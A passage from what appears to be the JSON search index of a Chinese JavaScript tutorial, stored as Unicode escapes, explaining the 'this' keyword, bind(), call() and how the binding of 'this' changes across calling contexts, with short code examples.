\u65b9\u6cd5\u7684\u4e3b\u8981\u76ee\u7684\u662f\u7ed1\u5b9a\u53c2\u6570 x \uff0c\u4ee5\u540e\u6bcf\u6b21\u8fd0\u884c\u65b0\u51fd\u6570 plus5() \uff0c\u5c31\u53ea\u9700\u8981\u63d0\u4f9b\u53e6\u4e00\u4e2a\u53c2\u6570 y \u5c31\u591f\u4e86\u3002\u800c\u4e14\u56e0\u4e3a add() \u5185\u90e8\u6ca1\u6709 this \uff0c\u6240\u4ee5 bind() \u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f null \uff0c\u4e0d\u8fc7\u8fd9\u91cc\u5982\u679c\u662f\u5176\u4ed6\u5bf9\u8c61\uff0c\u4e5f\u6ca1\u6709\u5f71\u54cd\u3002 bind() \u65b9\u6cd5\u6709\u4e00\u4e9b\u4f7f\u7528\u6ce8\u610f\u70b9\u3002 \uff081\uff09\u6bcf\u4e00\u6b21\u8fd4\u56de\u4e00\u4e2a\u65b0\u51fd\u6570 bind() \u65b9\u6cd5\u6bcf\u8fd0\u884c\u4e00\u6b21\uff0c\u5c31\u8fd4\u56de\u4e00\u4e2a\u65b0\u51fd\u6570\uff0c\u8fd9\u4f1a\u4ea7\u751f\u4e00\u4e9b\u95ee\u9898\u3002\u6bd4\u5982\uff0c\u76d1\u542c\u4e8b\u4ef6\u7684\u65f6\u5019\uff0c\u4e0d\u80fd\u5199\u6210\u4e0b\u9762\u8fd9\u6837\u3002 1 element . addEventListener ( 'click' , o . m . bind ( o )); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c click \u4e8b\u4ef6\u7ed1\u5b9a bind() \u65b9\u6cd5\u751f\u6210\u7684\u4e00\u4e2a\u533f\u540d\u51fd\u6570\u3002\u8fd9\u6837\u4f1a\u5bfc\u81f4\u65e0\u6cd5\u53d6\u6d88\u7ed1\u5b9a\uff0c\u6240\u4ee5\u4e0b\u9762\u7684\u4ee3\u7801\u662f\u65e0\u6548\u7684\u3002 1 element . removeEventListener ( 'click' , o . m . bind ( o )); \u6b63\u786e\u7684\u65b9\u6cd5\u662f\u5199\u6210\u4e0b\u9762\u8fd9\u6837\uff1a 1 2 3 4 var listener = o . m . bind ( o ); element . addEventListener ( 'click' , listener ); // ... element . removeEventListener ( 'click' , listener ); \uff082\uff09\u7ed3\u5408\u56de\u8c03\u51fd\u6570\u4f7f\u7528 \u56de\u8c03\u51fd\u6570\u662f JavaScript \u6700\u5e38\u7528\u7684\u6a21\u5f0f\u4e4b\u4e00\uff0c\u4f46\u662f\u4e00\u4e2a\u5e38\u89c1\u7684\u9519\u8bef\u662f\uff0c\u5c06\u5305\u542b this \u7684\u65b9\u6cd5\u76f4\u63a5\u5f53\u4f5c\u56de\u8c03\u51fd\u6570\u3002\u89e3\u51b3\u65b9\u6cd5\u5c31\u662f\u4f7f\u7528 bind() \u65b9\u6cd5\uff0c\u5c06 counter.inc() \u7ed1\u5b9a counter \u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 var counter = { count : 0 , inc : function () { 'use strict' ; this . count ++ ; } }; function callIt ( callback ) { callback (); } callIt ( counter . inc . bind ( counter )); counter . count // 1 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c callIt() \u65b9\u6cd5\u4f1a\u8c03\u7528\u56de\u8c03\u51fd\u6570\u3002\u8fd9\u65f6\u5982\u679c\u76f4\u63a5\u628a counter.inc \u4f20\u5165\uff0c\u8c03\u7528\u65f6 counter.inc() \u5185\u90e8\u7684 this \u5c31\u4f1a\u6307\u5411\u5168\u5c40\u5bf9\u8c61\u3002\u4f7f\u7528 bind() \u65b9\u6cd5\u5c06 counter.inc \u7ed1\u5b9a counter \u4ee5\u540e\uff0c\u5c31\u4e0d\u4f1a\u6709\u8fd9\u4e2a\u95ee\u9898\uff0c this \u603b\u662f\u6307\u5411 counter \u3002 \u8fd8\u6709\u4e00\u79cd\u60c5\u51b5\u6bd4\u8f83\u9690\u853d\uff0c\u5c31\u662f\u67d0\u4e9b\u6570\u7ec4\u65b9\u6cd5\u53ef\u4ee5\u63a5\u53d7\u4e00\u4e2a\u51fd\u6570\u5f53\u4f5c\u53c2\u6570\u3002\u8fd9\u4e9b\u51fd\u6570\u5185\u90e8\u7684 this \u6307\u5411\uff0c\u5f88\u53ef\u80fd\u4e5f\u4f1a\u51fa\u9519\u3002 1 2 3 4 5 6 7 8 9 10 11 12 var obj = { name : '\u5f20\u4e09' , times : [ 1 , 2 , 3 ], print : function () { this . times . forEach ( function ( n ) { console . log ( this . name ); }); } }; obj . print () // \u6ca1\u6709\u4efb\u4f55\u8f93\u51fa \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c obj.print \u5185\u90e8 this.times \u7684 this \u662f\u6307\u5411 obj \u7684\uff0c\u8fd9\u4e2a\u6ca1\u6709\u95ee\u9898\u3002\u4f46\u662f\uff0c forEach() \u65b9\u6cd5\u7684\u56de\u8c03\u51fd\u6570\u5185\u90e8\u7684 this.name \u5374\u662f\u6307\u5411\u5168\u5c40\u5bf9\u8c61\uff0c\u5bfc\u81f4\u6ca1\u6709\u529e\u6cd5\u53d6\u5230\u503c\u3002\u7a0d\u5fae\u6539\u52a8\u4e00\u4e0b\uff0c\u5c31\u53ef\u4ee5\u770b\u5f97\u66f4\u6e05\u695a\u3002 1 2 3 4 5 6 7 8 9 10 obj . print = function () { this . times . forEach ( function ( n ) { console . log ( this === window ); }); }; obj . print () // true // true // true \u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u4e5f\u662f\u901a\u8fc7 bind() \u65b9\u6cd5\u7ed1\u5b9a this \u3002 1 2 3 4 5 6 7 8 9 10 obj . print = function () { this . times . forEach ( function ( n ) { console . log ( this . name ); }. bind ( this )); }; obj . print () // \u5f20\u4e09 // \u5f20\u4e09 // \u5f20\u4e09 \uff083\uff09\u7ed3\u5408 call() \u65b9\u6cd5\u4f7f\u7528 \u5229\u7528 bind() \u65b9\u6cd5\uff0c\u53ef\u4ee5\u6539\u5199\u4e00\u4e9b JavaScript \u539f\u751f\u65b9\u6cd5\u7684\u4f7f\u7528\u5f62\u5f0f\uff0c\u4ee5\u6570\u7ec4\u7684 slice() \u65b9\u6cd5\u4e3a\u4f8b\u3002 1 2 3 [ 1 , 2 , 3 ]. slice ( 0 , 1 ) // [1] // \u7b49\u540c\u4e8e Array . prototype . slice . call ([ 1 , 2 , 3 ], 0 , 1 ) // [1] \u4e0a\u9762\u7684\u4ee3\u7801\u4e2d\uff0c\u6570\u7ec4\u7684 slice \u65b9\u6cd5\u4ece [1, 2, 3] \u91cc\u9762\uff0c\u6309\u7167\u6307\u5b9a\u7684\u5f00\u59cb\u4f4d\u7f6e\u548c\u7ed3\u675f\u4f4d\u7f6e\uff0c\u5207\u5206\u51fa\u53e6\u4e00\u4e2a\u6570\u7ec4\u3002\u8fd9\u6837\u505a\u7684\u672c\u8d28\u662f\u5728 [1, 2, 3] \u4e0a\u9762\u8c03\u7528 Array.prototype.slice() \u65b9\u6cd5\uff0c\u56e0\u6b64\u53ef\u4ee5\u7528 call \u65b9\u6cd5\u8868\u8fbe\u8fd9\u4e2a\u8fc7\u7a0b\uff0c\u5f97\u5230\u540c\u6837\u7684\u7ed3\u679c\u3002 call() \u65b9\u6cd5\u5b9e\u8d28\u4e0a\u662f\u8c03\u7528 Function.prototype.call() \u65b9\u6cd5\uff0c\u56e0\u6b64\u4e0a\u9762\u7684\u8868\u8fbe\u5f0f\u53ef\u4ee5\u7528 bind() \u65b9\u6cd5\u6539\u5199\u3002 1 2 var slice = Function . prototype . call . bind ( Array . prototype . slice ); slice ([ 1 , 2 , 3 ], 0 , 1 ) // [1] \u4e0a\u9762\u4ee3\u7801\u7684\u542b\u4e49\u5c31\u662f\uff0c\u5c06 Array.prototype.slice \u53d8\u6210 Function.prototype.call \u65b9\u6cd5\u6240\u5728\u7684\u5bf9\u8c61\uff0c\u8c03\u7528\u65f6\u5c31\u53d8\u6210\u4e86 Array.prototype.slice.call \u3002\u7c7b\u4f3c\u7684\u5199\u6cd5\u8fd8\u53ef\u4ee5\u7528\u4e8e\u5176\u4ed6\u6570\u7ec4\u65b9\u6cd5\u3002 1 2 3 4 5 6 7 8 9 var push = Function . prototype . call . bind ( Array . prototype . push ); var pop = Function . prototype . call . bind ( Array . prototype . pop ); var a = [ 1 , 2 , 3 ]; push ( a , 4 ) a // [1, 2, 3, 4] pop ( a ) a // [1, 2, 3] \u5982\u679c\u518d\u8fdb\u4e00\u6b65\uff0c\u5c06 Function.prototype.call \u65b9\u6cd5\u7ed1\u5b9a\u5230 Function.prototype.bind \u5bf9\u8c61\uff0c\u5c31\u610f\u5473\u7740 bind \u7684\u8c03\u7528\u5f62\u5f0f\u4e5f\u53ef\u4ee5\u88ab\u6539\u5199\u3002 1 2 3 4 5 6 7 function f () { console . log ( this . v ); } var o = { v : 123 }; var bind = Function . prototype . call . bind ( Function . prototype . bind ); bind ( f , o )() // 123 \u4e0a\u9762\u4ee3\u7801\u7684\u542b\u4e49\u5c31\u662f\uff0c\u5c06 Function.prototype.bind \u65b9\u6cd5\u7ed1\u5b9a\u5728 Function.prototype.call \u4e0a\u9762\uff0c\u6240\u4ee5 bind \u65b9\u6cd5\u5c31\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\uff0c\u4e0d\u9700\u8981\u5728\u51fd\u6570\u5b9e\u4f8b\u4e0a\u4f7f\u7528\u3002 \u53c2\u8003\u94fe\u63a5 \u00b6 Jonathan Creamer, Avoiding the \"this\" problem in JavaScript Erik Kronberg, Bind, Call and Apply in JavaScript Axel Rauschmayer, JavaScript\u2019s this: how it works, where it can trip you up","title":"this \u5173\u952e\u5b57"},{"location":"oop/this/#this","text":"","title":"this \u5173\u952e\u5b57"},{"location":"oop/this/#_1","text":"this \u5173\u952e\u5b57\u662f\u4e00\u4e2a\u975e\u5e38\u91cd\u8981\u7684\u8bed\u6cd5\u70b9\u3002\u6beb\u4e0d\u5938\u5f20\u5730\u8bf4\uff0c\u4e0d\u7406\u89e3\u5b83\u7684\u542b\u4e49\uff0c\u5927\u90e8\u5206\u5f00\u53d1\u4efb\u52a1\u90fd\u65e0\u6cd5\u5b8c\u6210\u3002 \u524d\u4e00\u7ae0\u5df2\u7ecf\u63d0\u5230\uff0c this \u53ef\u4ee5\u7528\u5728\u6784\u9020\u51fd\u6570\u4e4b\u4e2d\uff0c\u8868\u793a\u5b9e\u4f8b\u5bf9\u8c61\u3002\u9664\u6b64\u4e4b\u5916\uff0c this \u8fd8\u53ef\u4ee5\u7528\u5728\u522b\u7684\u573a\u5408\u3002\u4f46\u4e0d\u7ba1\u662f\u4ec0\u4e48\u573a\u5408\uff0c this \u90fd\u6709\u4e00\u4e2a\u5171\u540c\u70b9\uff1a\u5b83\u603b\u662f\u8fd4\u56de\u4e00\u4e2a\u5bf9\u8c61\u3002 \u7b80\u5355\u8bf4\uff0c this \u5c31\u662f\u5c5e\u6027\u6216\u65b9\u6cd5\u201c\u5f53\u524d\u201d\u6240\u5728\u7684\u5bf9\u8c61\u3002 1 this . property \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c this \u5c31\u4ee3\u8868 property \u5c5e\u6027\u5f53\u524d\u6240\u5728\u7684\u5bf9\u8c61\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u5b9e\u9645\u7684\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 var person = { name : '\u5f20\u4e09' , describe : function () { return '\u59d3\u540d\uff1a' + this . name ; } }; person . describe () // \"\u59d3\u540d\uff1a\u5f20\u4e09\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c this.name \u8868\u793a name \u5c5e\u6027\u6240\u5728\u7684\u90a3\u4e2a\u5bf9\u8c61\u3002\u7531\u4e8e this.name \u662f\u5728 describe \u65b9\u6cd5\u4e2d\u8c03\u7528\uff0c\u800c describe \u65b9\u6cd5\u6240\u5728\u7684\u5f53\u524d\u5bf9\u8c61\u662f person \uff0c\u56e0\u6b64 this \u6307\u5411 person \uff0c this.name \u5c31\u662f person.name \u3002 \u7531\u4e8e\u5bf9\u8c61\u7684\u5c5e\u6027\u53ef\u4ee5\u8d4b\u7ed9\u53e6\u4e00\u4e2a\u5bf9\u8c61\uff0c\u6240\u4ee5\u5c5e\u6027\u6240\u5728\u7684\u5f53\u524d\u5bf9\u8c61\u662f\u53ef\u53d8\u7684\uff0c\u5373 this \u7684\u6307\u5411\u662f\u53ef\u53d8\u7684\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 var A = { name : '\u5f20\u4e09' , describe : function () { return '\u59d3\u540d\uff1a' + this . name ; } }; var B = { name : '\u674e\u56db' }; B . describe = A . describe ; B . describe () // \"\u59d3\u540d\uff1a\u674e\u56db\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c A.describe \u5c5e\u6027\u88ab\u8d4b\u7ed9 B \uff0c\u4e8e\u662f B.describe \u5c31\u8868\u793a describe \u65b9\u6cd5\u6240\u5728\u7684\u5f53\u524d\u5bf9\u8c61\u662f B \uff0c\u6240\u4ee5 this.name \u5c31\u6307\u5411 B.name \u3002 \u7a0d\u7a0d\u91cd\u6784\u8fd9\u4e2a\u4f8b\u5b50\uff0c this \u7684\u52a8\u6001\u6307\u5411\u5c31\u80fd\u770b\u5f97\u66f4\u6e05\u695a\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 function f () { return '\u59d3\u540d\uff1a' + this . name ; } var A = { name : '\u5f20\u4e09' , describe : f }; var B = { name : '\u674e\u56db' , describe : f }; A . describe () // \"\u59d3\u540d\uff1a\u5f20\u4e09\" B . describe () // \"\u59d3\u540d\uff1a\u674e\u56db\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u51fd\u6570 f \u5185\u90e8\u4f7f\u7528\u4e86 this \u5173\u952e\u5b57\uff0c\u968f\u7740 f \u6240\u5728\u7684\u5bf9\u8c61\u4e0d\u540c\uff0c this \u7684\u6307\u5411\u4e5f\u4e0d\u540c\u3002 \u53ea\u8981\u51fd\u6570\u88ab\u8d4b\u7ed9\u53e6\u4e00\u4e2a\u53d8\u91cf\uff0c this \u7684\u6307\u5411\u5c31\u4f1a\u53d8\u3002 1 2 3 4 5 6 7 8 9 10 var A = { name : '\u5f20\u4e09' , describe : function () { return '\u59d3\u540d\uff1a' + this . name ; } }; var name = '\u674e\u56db' ; var f = A . describe ; f () // \"\u59d3\u540d\uff1a\u674e\u56db\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c A.describe \u88ab\u8d4b\u503c\u7ed9\u53d8\u91cf f \uff0c\u5185\u90e8\u7684 this \u5c31\u4f1a\u6307\u5411 f \u8fd0\u884c\u65f6\u6240\u5728\u7684\u5bf9\u8c61\uff08\u672c\u4f8b\u662f\u9876\u5c42\u5bf9\u8c61\uff09\u3002 \u518d\u770b\u4e00\u4e2a\u7f51\u9875\u7f16\u7a0b\u7684\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 < input type = \"text\" name = \"age\" size = 3 onChange = \"validate(this, 18, 99);\" > < script > function validate ( obj , lowval , hival ){ if (( obj . value < lowval ) || ( obj . value > hival )) console . log ( 'Invalid Value!' ); } </ script > \u4e0a\u9762\u4ee3\u7801\u662f\u4e00\u4e2a\u6587\u672c\u8f93\u5165\u6846\uff0c\u6bcf\u5f53\u7528\u6237\u8f93\u5165\u4e00\u4e2a\u503c\uff0c\u5c31\u4f1a\u8c03\u7528 onChange \u56de\u8c03\u51fd\u6570\uff0c\u9a8c\u8bc1\u8fd9\u4e2a\u503c\u662f\u5426\u5728\u6307\u5b9a\u8303\u56f4\u3002\u6d4f\u89c8\u5668\u4f1a\u5411\u56de\u8c03\u51fd\u6570\u4f20\u5165\u5f53\u524d\u5bf9\u8c61\uff0c\u56e0\u6b64 this \u5c31\u4ee3\u8868\u4f20\u5165\u5f53\u524d\u5bf9\u8c61\uff08\u5373\u6587\u672c\u6846\uff09\uff0c\u7136\u540e\u5c31\u53ef\u4ee5\u4ece this.value \u4e0a\u9762\u8bfb\u5230\u7528\u6237\u7684\u8f93\u5165\u503c\u3002 \u603b\u7ed3\u4e00\u4e0b\uff0cJavaScript \u8bed\u8a00\u4e4b\u4e2d\uff0c\u4e00\u5207\u7686\u5bf9\u8c61\uff0c\u8fd0\u884c\u73af\u5883\u4e5f\u662f\u5bf9\u8c61\uff0c\u6240\u4ee5\u51fd\u6570\u90fd\u662f\u5728\u67d0\u4e2a\u5bf9\u8c61\u4e4b\u4e2d\u8fd0\u884c\uff0c this \u5c31\u662f\u51fd\u6570\u8fd0\u884c\u65f6\u6240\u5728\u7684\u5bf9\u8c61\uff08\u73af\u5883\uff09\u3002\u8fd9\u672c\u6765\u5e76\u4e0d\u4f1a\u8ba9\u7528\u6237\u7cca\u6d82\uff0c\u4f46\u662f JavaScript \u652f\u6301\u8fd0\u884c\u73af\u5883\u52a8\u6001\u5207\u6362\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c this \u7684\u6307\u5411\u662f\u52a8\u6001\u7684\uff0c\u6ca1\u6709\u529e\u6cd5\u4e8b\u5148\u786e\u5b9a\u5230\u5e95\u6307\u5411\u54ea\u4e2a\u5bf9\u8c61\uff0c\u8fd9\u624d\u662f\u6700\u8ba9\u521d\u5b66\u8005\u611f\u5230\u56f0\u60d1\u7684\u5730\u65b9\u3002","title":"\u6db5\u4e49"},{"location":"oop/this/#_2","text":"JavaScript \u8bed\u8a00\u4e4b\u6240\u4ee5\u6709 this \u7684\u8bbe\u8ba1\uff0c\u8ddf\u5185\u5b58\u91cc\u9762\u7684\u6570\u636e\u7ed3\u6784\u6709\u5173\u7cfb\u3002 1 var obj = { foo : 5 }; \u4e0a\u9762\u7684\u4ee3\u7801\u5c06\u4e00\u4e2a\u5bf9\u8c61\u8d4b\u503c\u7ed9\u53d8\u91cf obj \u3002JavaScript \u5f15\u64ce\u4f1a\u5148\u5728\u5185\u5b58\u91cc\u9762\uff0c\u751f\u6210\u4e00\u4e2a\u5bf9\u8c61 { foo: 5 } \uff0c\u7136\u540e\u628a\u8fd9\u4e2a\u5bf9\u8c61\u7684\u5185\u5b58\u5730\u5740\u8d4b\u503c\u7ed9\u53d8\u91cf obj \u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u53d8\u91cf obj \u662f\u4e00\u4e2a\u5730\u5740\uff08reference\uff09\u3002\u540e\u9762\u5982\u679c\u8981\u8bfb\u53d6 obj.foo \uff0c\u5f15\u64ce\u5148\u4ece obj \u62ff\u5230\u5185\u5b58\u5730\u5740\uff0c\u7136\u540e\u518d\u4ece\u8be5\u5730\u5740\u8bfb\u51fa\u539f\u59cb\u7684\u5bf9\u8c61\uff0c\u8fd4\u56de\u5b83\u7684 foo \u5c5e\u6027\u3002 \u539f\u59cb\u7684\u5bf9\u8c61\u4ee5\u5b57\u5178\u7ed3\u6784\u4fdd\u5b58\uff0c\u6bcf\u4e00\u4e2a\u5c5e\u6027\u540d\u90fd\u5bf9\u5e94\u4e00\u4e2a\u5c5e\u6027\u63cf\u8ff0\u5bf9\u8c61\u3002\u4e3e\u4f8b\u6765\u8bf4\uff0c\u4e0a\u9762\u4f8b\u5b50\u7684 foo \u5c5e\u6027\uff0c\u5b9e\u9645\u4e0a\u662f\u4ee5\u4e0b\u9762\u7684\u5f62\u5f0f\u4fdd\u5b58\u7684\u3002 1 2 3 4 5 6 7 8 { foo : { [[ value ]] : 5 [[ writable ]] : true [[ enumerable ]] : true [[ configurable ]] : true } } \u6ce8\u610f\uff0c foo \u5c5e\u6027\u7684\u503c\u4fdd\u5b58\u5728\u5c5e\u6027\u63cf\u8ff0\u5bf9\u8c61\u7684 value \u5c5e\u6027\u91cc\u9762\u3002 \u8fd9\u6837\u7684\u7ed3\u6784\u662f\u5f88\u6e05\u6670\u7684\uff0c\u95ee\u9898\u5728\u4e8e\u5c5e\u6027\u7684\u503c\u53ef\u80fd\u662f\u4e00\u4e2a\u51fd\u6570\u3002 1 var obj = { foo : function () {} }; \u8fd9\u65f6\uff0c\u5f15\u64ce\u4f1a\u5c06\u51fd\u6570\u5355\u72ec\u4fdd\u5b58\u5728\u5185\u5b58\u4e2d\uff0c\u7136\u540e\u518d\u5c06\u51fd\u6570\u7684\u5730\u5740\u8d4b\u503c\u7ed9 foo \u5c5e\u6027\u7684 value \u5c5e\u6027\u3002 1 2 3 4 5 6 { foo : { [[ value ]] : \u51fd\u6570\u7684\u5730\u5740 ... } } \u7531\u4e8e\u51fd\u6570\u662f\u4e00\u4e2a\u5355\u72ec\u7684\u503c\uff0c\u6240\u4ee5\u5b83\u53ef\u4ee5\u5728\u4e0d\u540c\u7684\u73af\u5883\uff08\u4e0a\u4e0b\u6587\uff09\u6267\u884c\u3002 1 2 3 4 5 6 7 8 var f = function () {}; var obj = { f : f }; // \u5355\u72ec\u6267\u884c f () // obj \u73af\u5883\u6267\u884c obj . f () JavaScript \u5141\u8bb8\u5728\u51fd\u6570\u4f53\u5185\u90e8\uff0c\u5f15\u7528\u5f53\u524d\u73af\u5883\u7684\u5176\u4ed6\u53d8\u91cf\u3002 1 2 3 var f = function () { console . log ( x ); }; \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u51fd\u6570\u4f53\u91cc\u9762\u4f7f\u7528\u4e86\u53d8\u91cf x \u3002\u8be5\u53d8\u91cf\u7531\u8fd0\u884c\u73af\u5883\u63d0\u4f9b\u3002 \u73b0\u5728\u95ee\u9898\u5c31\u6765\u4e86\uff0c\u7531\u4e8e\u51fd\u6570\u53ef\u4ee5\u5728\u4e0d\u540c\u7684\u8fd0\u884c\u73af\u5883\u6267\u884c\uff0c\u6240\u4ee5\u9700\u8981\u6709\u4e00\u79cd\u673a\u5236\uff0c\u80fd\u591f\u5728\u51fd\u6570\u4f53\u5185\u90e8\u83b7\u5f97\u5f53\u524d\u7684\u8fd0\u884c\u73af\u5883\uff08context\uff09\u3002\u6240\u4ee5\uff0c this \u5c31\u51fa\u73b0\u4e86\uff0c\u5b83\u7684\u8bbe\u8ba1\u76ee\u7684\u5c31\u662f\u5728\u51fd\u6570\u4f53\u5185\u90e8\uff0c\u6307\u4ee3\u51fd\u6570\u5f53\u524d\u7684\u8fd0\u884c\u73af\u5883\u3002 1 2 3 var f = function () { console . log ( this . x ); } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u51fd\u6570\u4f53\u91cc\u9762\u7684 this.x \u5c31\u662f\u6307\u5f53\u524d\u8fd0\u884c\u73af\u5883\u7684 x \u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 var f = function () { console . log ( this . x ); } var x = 1 ; var obj = { f : f , x : 2 , }; // \u5355\u72ec\u6267\u884c f () // 1 // obj \u73af\u5883\u6267\u884c obj . f () // 2 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u51fd\u6570 f \u5728\u5168\u5c40\u73af\u5883\u6267\u884c\uff0c this.x \u6307\u5411\u5168\u5c40\u73af\u5883\u7684 x \uff1b\u5728 obj \u73af\u5883\u6267\u884c\uff0c this.x \u6307\u5411 obj.x \u3002","title":"\u5b9e\u8d28"},{"location":"oop/this/#_3","text":"this \u4e3b\u8981\u6709\u4ee5\u4e0b\u51e0\u4e2a\u4f7f\u7528\u573a\u5408\u3002 \uff081\uff09\u5168\u5c40\u73af\u5883 \u5168\u5c40\u73af\u5883\u4f7f\u7528 this \uff0c\u5b83\u6307\u7684\u5c31\u662f\u9876\u5c42\u5bf9\u8c61 window \u3002 1 2 3 4 5 6 this === window // true function f () { console . log ( this === window ); } f () // true \u4e0a\u9762\u4ee3\u7801\u8bf4\u660e\uff0c\u4e0d\u7ba1\u662f\u4e0d\u662f\u5728\u51fd\u6570\u5185\u90e8\uff0c\u53ea\u8981\u662f\u5728\u5168\u5c40\u73af\u5883\u4e0b\u8fd0\u884c\uff0c this \u5c31\u662f\u6307\u9876\u5c42\u5bf9\u8c61 window \u3002 \uff082\uff09\u6784\u9020\u51fd\u6570 \u6784\u9020\u51fd\u6570\u4e2d\u7684 this \uff0c\u6307\u7684\u662f\u5b9e\u4f8b\u5bf9\u8c61\u3002 1 2 3 var Obj = function ( p ) { this . p = p ; }; \u4e0a\u9762\u4ee3\u7801\u5b9a\u4e49\u4e86\u4e00\u4e2a\u6784\u9020\u51fd\u6570 Obj \u3002\u7531\u4e8e this \u6307\u5411\u5b9e\u4f8b\u5bf9\u8c61\uff0c\u6240\u4ee5\u5728\u6784\u9020\u51fd\u6570\u5185\u90e8\u5b9a\u4e49 this.p \uff0c\u5c31\u76f8\u5f53\u4e8e\u5b9a\u4e49\u5b9e\u4f8b\u5bf9\u8c61\u6709\u4e00\u4e2a p \u5c5e\u6027\u3002 1 2 var o = new Obj ( 'Hello World!' ); o . p // \"Hello World!\" \uff083\uff09\u5bf9\u8c61\u7684\u65b9\u6cd5 \u5982\u679c\u5bf9\u8c61\u7684\u65b9\u6cd5\u91cc\u9762\u5305\u542b this \uff0c this \u7684\u6307\u5411\u5c31\u662f\u65b9\u6cd5\u8fd0\u884c\u65f6\u6240\u5728\u7684\u5bf9\u8c61\u3002\u8be5\u65b9\u6cd5\u8d4b\u503c\u7ed9\u53e6\u4e00\u4e2a\u5bf9\u8c61\uff0c\u5c31\u4f1a\u6539\u53d8 this \u7684\u6307\u5411\u3002 \u4f46\u662f\uff0c\u8fd9\u6761\u89c4\u5219\u5f88\u4e0d\u5bb9\u6613\u628a\u63e1\u3002\u8bf7\u770b\u4e0b\u9762\u7684\u4ee3\u7801\u3002 1 2 3 4 5 6 7 var obj = { foo : function () { console . log ( this ); } }; obj . foo () // obj \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c obj.foo \u65b9\u6cd5\u6267\u884c\u65f6\uff0c\u5b83\u5185\u90e8\u7684 this \u6307\u5411 obj \u3002 \u4f46\u662f\uff0c\u4e0b\u9762\u8fd9\u51e0\u79cd\u7528\u6cd5\uff0c\u90fd\u4f1a\u6539\u53d8 this \u7684\u6307\u5411\u3002 1 2 3 4 5 6 // \u60c5\u51b5\u4e00 ( obj . foo = obj . foo )() // window // \u60c5\u51b5\u4e8c ( false || obj . foo )() // window // \u60c5\u51b5\u4e09 ( 1 , obj . foo )() // window \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c obj.foo \u5c31\u662f\u4e00\u4e2a\u503c\u3002\u8fd9\u4e2a\u503c\u771f\u6b63\u8c03\u7528\u7684\u65f6\u5019\uff0c\u8fd0\u884c\u73af\u5883\u5df2\u7ecf\u4e0d\u662f obj \u4e86\uff0c\u800c\u662f\u5168\u5c40\u73af\u5883\uff0c\u6240\u4ee5 this \u4e0d\u518d\u6307\u5411 obj \u3002 \u53ef\u4ee5\u8fd9\u6837\u7406\u89e3\uff0cJavaScript \u5f15\u64ce\u5185\u90e8\uff0c obj \u548c obj.foo \u50a8\u5b58\u5728\u4e24\u4e2a\u5185\u5b58\u5730\u5740\uff0c\u79f0\u4e3a\u5730\u5740\u4e00\u548c\u5730\u5740\u4e8c\u3002 obj.foo() \u8fd9\u6837\u8c03\u7528\u65f6\uff0c\u662f\u4ece\u5730\u5740\u4e00\u8c03\u7528\u5730\u5740\u4e8c\uff0c\u56e0\u6b64\u5730\u5740\u4e8c\u7684\u8fd0\u884c\u73af\u5883\u662f\u5730\u5740\u4e00\uff0c this \u6307\u5411 obj \u3002\u4f46\u662f\uff0c\u4e0a\u9762\u4e09\u79cd\u60c5\u51b5\uff0c\u90fd\u662f\u76f4\u63a5\u53d6\u51fa\u5730\u5740\u4e8c\u8fdb\u884c\u8c03\u7528\uff0c\u8fd9\u6837\u7684\u8bdd\uff0c\u8fd0\u884c\u73af\u5883\u5c31\u662f\u5168\u5c40\u73af\u5883\uff0c\u56e0\u6b64 this \u6307\u5411\u5168\u5c40\u73af\u5883\u3002\u4e0a\u9762\u4e09\u79cd\u60c5\u51b5\u7b49\u540c\u4e8e\u4e0b\u9762\u7684\u4ee3\u7801\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 // \u60c5\u51b5\u4e00 ( obj . foo = function () { console . log ( this ); })() // \u7b49\u540c\u4e8e ( function () { console . log ( this ); })() // \u60c5\u51b5\u4e8c ( false || function () { console . log ( this ); })() // \u60c5\u51b5\u4e09 ( 1 , function () { console . log ( this ); })() \u5982\u679c this \u6240\u5728\u7684\u65b9\u6cd5\u4e0d\u5728\u5bf9\u8c61\u7684\u7b2c\u4e00\u5c42\uff0c\u8fd9\u65f6 this \u53ea\u662f\u6307\u5411\u5f53\u524d\u4e00\u5c42\u7684\u5bf9\u8c61\uff0c\u800c\u4e0d\u4f1a\u7ee7\u627f\u66f4\u4e0a\u9762\u7684\u5c42\u3002 1 2 3 4 5 6 7 8 9 10 var a = { p : 'Hello' , b : { m : function () { console . log ( this . p ); } } }; a . b . m () // undefined \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c a.b.m \u65b9\u6cd5\u5728 a \u5bf9\u8c61\u7684\u7b2c\u4e8c\u5c42\uff0c\u8be5\u65b9\u6cd5\u5185\u90e8\u7684 this \u4e0d\u662f\u6307\u5411 a \uff0c\u800c\u662f\u6307\u5411 a.b \uff0c\u56e0\u4e3a\u5b9e\u9645\u6267\u884c\u7684\u662f\u4e0b\u9762\u7684\u4ee3\u7801\u3002 1 2 3 4 5 6 7 8 9 10 11 12 var b = { m : function () { console . log ( this . p ); } }; var a = { p : 'Hello' , b : b }; ( a . b ). m () // \u7b49\u540c\u4e8e b.m() \u5982\u679c\u8981\u8fbe\u5230\u9884\u671f\u6548\u679c\uff0c\u53ea\u6709\u5199\u6210\u4e0b\u9762\u8fd9\u6837\u3002 1 2 3 4 5 6 7 8 var a = { b 